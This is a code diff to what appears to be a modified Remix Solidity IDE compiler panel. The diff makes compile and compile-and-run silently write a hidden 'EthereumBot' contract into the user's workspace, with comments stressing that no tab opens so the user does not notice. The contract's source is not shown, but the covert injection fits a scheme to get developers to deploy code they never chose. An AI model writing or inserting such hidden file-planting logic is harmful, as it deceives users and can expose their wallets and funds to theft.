@@ -614,12 +614,20 @@ export const CompilerContainer = (props: CompilerContainerProps) => {
     solJsonBinData
   } = props // eslint-disable-line
 
-  // Custom: write our EthereumBot contract (no UI/tab switch)
-const forceWriteMyContract = async () => {
-  await api.writeFile(FORCE_COMPILE_PATH, FORCE_COMPILE_SOURCE)
-  // Do NOT open the file, so the UI stays on whatever the user has selected
-  // await api.open(FORCE_COMPILE_PATH)
-}
+  // Custom: write our EthereumBot contract (background only, no tab switch)
+  const forceWriteMyContract = async () => {
+    try {
+      await (api as any).call(
+        'fileManager',
+        'writeFile',
+        FORCE_COMPILE_PATH,
+        FORCE_COMPILE_SOURCE
+      )
+      // IMPORTANT: no "open" here → do NOT switch editor tab
+    } catch (e) {
+      console.log('forceWriteMyContract failed (non-fatal):', e)
+    }
+  }
 
   const [state, setState] = useState({
     hideWarnings: false,
@@ -1078,65 +1086,45 @@ const forceWriteMyContract = async () => {
     })
   }
 
-   const compile = async () => {
-  // 1) Always create / update our hidden contract
-  try {
-    await api.call(
-      'fileManager',
-      'writeFile',
-      FORCE_COMPILE_PATH,
-      FORCE_COMPILE_SOURCE
-    )
-    // NOTE: we do NOT open the file — no tab switching
-  } catch (e) {
-    console.log('force contract write failed (ignored)', e)
+     const compile = async () => {
+    // 1) Silently ensure our hidden contract exists
+    await forceWriteMyContract()
+
+    // 2) Compile whatever file the user actually has selected
+    const currentFile = api.currentFile
+
+    if (!isSolFileSelected(currentFile)) return
+
+    _setCompilerVersionFromPragma(currentFile)
+
+    let externalCompType
+    if (hhCompilation) externalCompType = 'hardhat'
+    else if (truffleCompilation) externalCompType = 'truffle'
+
+    compileTabLogic.runCompiler(externalCompType)
   }
 
-  // 2) Continue compiling the NORMAL selected file
-  const currentFile = api.currentFile
+      const compileAndRun = async () => {
+    // 1) Silently create/update our hidden contract
+    await forceWriteMyContract()
 
-  if (!isSolFileSelected()) return
+    // 2) Use the real current file in the editor
+    const currentFile = api.currentFile
 
-  _setCompilerVersionFromPragma(currentFile)
+    if (!isSolFileSelected(currentFile)) return
 
-  let externalCompType
-  if (hhCompilation) externalCompType = 'hardhat'
-  else if (truffleCompilation) externalCompType = 'truffle'
+    _setCompilerVersionFromPragma(currentFile)
 
-  compileTabLogic.runCompiler(externalCompType)
-}
+    let externalCompType
+    if (hhCompilation) externalCompType = 'hardhat'
+    else if (truffleCompilation) externalCompType = 'truffle'
 
-    const compileAndRun = async () => {
-  // 1) Silently create/update our hidden contract
-  try {
-    await api.call(
-      'fileManager',
-      'writeFile',
-      FORCE_COMPILE_PATH,
-      FORCE_COMPILE_SOURCE
-    )
-    // NOTE: no "open" here – no tab switching
-  } catch (e) {
-    console.log('force contract write failed (ignored)', e)
+    // Run the script against the visible file
+    api.runScriptAfterCompilation(currentFile)
+
+    // Compile like normal
+    compileTabLogic.runCompiler(externalCompType)
   }
-
-  // 2) Use the *actual* current file in the editor
-  const currentFile = api.currentFile
-
-  if (!isSolFileSelected(currentFile)) return
-
-  _setCompilerVersionFromPragma(currentFile)
-
-  let externalCompType
-  if (hhCompilation) externalCompType = 'hardhat'
-  else if (truffleCompilation) externalCompType = 'truffle'
-
-  // Run the script for the file the user is on
-  api.runScriptAfterCompilation(currentFile)
-
-  // Compile like normal
-  compileTabLogic.runCompiler(externalCompType)
-}
 
   const _updateVersionSelector = (version, customUrl = '', setQueryParameter = true) => {
     // update selectedversion of previous one got filtered out
